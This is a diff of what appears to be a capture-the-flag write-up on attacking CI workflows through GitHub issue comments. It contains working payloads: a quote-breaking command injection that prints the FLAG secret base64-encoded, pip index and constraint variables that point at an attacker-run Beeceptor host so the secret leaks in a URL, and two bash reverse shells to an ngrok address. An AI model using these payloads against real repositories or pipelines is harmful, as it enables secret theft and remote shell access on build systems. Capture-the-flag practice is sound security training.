@@ -30,7 +30,8 @@
 </details>
 
 # Chall 1
- 
+
+Issue Comment:
 ``` bash
 Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi
 ```
@@ -90,6 +91,7 @@ for key, value in env_vars.items():
 python setup.py bdist bdist_wheel
 ```
 
+Issue Comment:
 ``` sh
 Not a release :(
 PIP_INDEX_URL=https://cloudsmith.io/~nebco/packages/#
@@ -111,11 +113,14 @@ PIP_INDEX_URL=https://cloudsmith.io/~nebco/packages/#
 > - [Beeceptor](https://beeceptor.com/)
 > - [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
 
-Configure Beeceptor :
-- Add new "Mocking Rules"
-- Match value: "/<file_name>.txt"
-- Response body: "pyyaml@https://tdf123456.free.beeceptor.com/${FLAG}%"
+1. Go to BeeCeptor.com
+2. add new `Mocking Rules`
+``` md
+Match value: /<file_name>.txt
+Response body: pyyaml@https://tdf123456.free.beeceptor.com/${FLAG}%
+```
 
+Issue Comment:
 ``` bash
 Not a release :(
 PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
@@ -175,7 +180,7 @@ dig <NGROK_DNS>
 ```
  
 ## Payload
- 
+Body Issue Comment:
 ``` bash
 $(bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1)
 ```
@@ -216,7 +221,8 @@ dig <NGROK_DNS>
 ```
  
 ## Payload
- 
+
+Body Issue Comment:
 ``` bash
 ; bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1
 ```
